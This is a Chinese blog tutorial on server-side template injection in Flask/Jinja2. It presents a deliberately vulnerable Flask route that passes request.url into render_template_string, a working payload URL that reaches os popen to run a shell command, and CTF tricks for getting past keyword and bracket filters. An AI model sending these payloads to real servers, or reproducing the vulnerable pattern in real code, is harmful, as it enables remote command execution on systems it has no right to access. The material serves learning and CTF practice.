---
title: flask模板注入
date: 2025-01-10 14:50:20
categories: WEB
tags: web
updated: 2025-01-10 14:50:20
---
# flask模板注入

作为 Web 中的难点还是有必要涉猎一番  
参考文章: [flask之ssti模版注入从零到入门](https://xz.aliyun.com/t/3679?time__1311=n4%2Bxnii%3DoGqmqDK0QDODlx6e0%3DbG%3DKtezkWGb84D)

## 模板代码

代码基于 Python，使用 Flask 框架，模板使用 Jinja2，需要额外下载 Flask 和 Jinja2，用 PyCharm 可能会简单一点。  
解释：`index` 是没有漏洞点的，漏洞点在 `test` 中。

```python
from flask import Flask
from flask import render_template
from flask import request
from flask import render_template_string

app = Flask(__name__)

@app.route('/')
@app.route('/index')  # 我们访问 / 或 /index 都会跳转
def index():
    return render_template("index.html", title='Home', user=request.args.get("key"))

@app.route('/test', methods=['GET', 'POST'])
def test():
    template = '''
        <div class="center-content error">
            <h1>Oops! That page doesn't exist.</h1>
            <h3>%s</h3>
        </div> 
    ''' % request.url

    return render_template_string(template)

if __name__ == '__main__':
    app.debug = True
    app.run()
```

### 示例 `index.html`

```html
<html>
  <head>
    <title>{{ title }} - 小猪佩奇</title>
  </head>
  <body>
    <h1>Hello, {{ user.name }}!</h1>
  </body>
</html>
```

### SSTI 利用示例

利用 Python 的类继承，我们可以反向调用其他的函数。  
一般是 `<class 'os._wrap_close'>`，每个版本不同，Python 3.8 中为 `133`。

```text
http://127.0.0.1:5000/test?key={{"".__class__.__bases__[0].__subclasses__()[133].__init__.__globals__['popen']('dir').read()}}
```

![](https://gitee.com/fogpost/photo/raw/master/202501101750658.png)

## CTF 中的一些绕过 Tips

1. **过滤 `[]` 等括号**  
   使用 `getitem` 绕过。例如原 POC：`{{"".class.bases[0]}}`  
   绕过后：`{{"".class.bases.getitem(0)}}`

2. **过滤 `subclasses`，拼凑法**  
   原 POC：`{{"".class.bases[0].subclasses()}}`  
   绕过后：`{{"".class.bases[0]['subcla' + 'sses']}}`

3. **过滤 `class`**  
   使用 `session` 绕过：  
   POC：`{{session['cla' + 'ss'].bases[0].bases[0].bases[0].bases[0].subclasses()[133]}}`

   多个 `bases[0]` 是因为一直在向上找 `object` 类。使用 `mro` 更方便：  
   - `{{session['__cla' + 'ss__'].__mro__[12]}}`  
   或  
   - `{{request['__cl' + 'ass__'].__mro__[12]}}`

<!-- 4. **`timeit` 姿势**   -->


示例：[2017 SWPU-CTF 的一道沙盒 Python 题](https://www.secpulse.com/archives/65568.html)

## 一张图总结一下 SSTI 的一些模板渲染引擎及利用

![](https://gitee.com/fogpost/photo/raw/master/202501101756362.png)
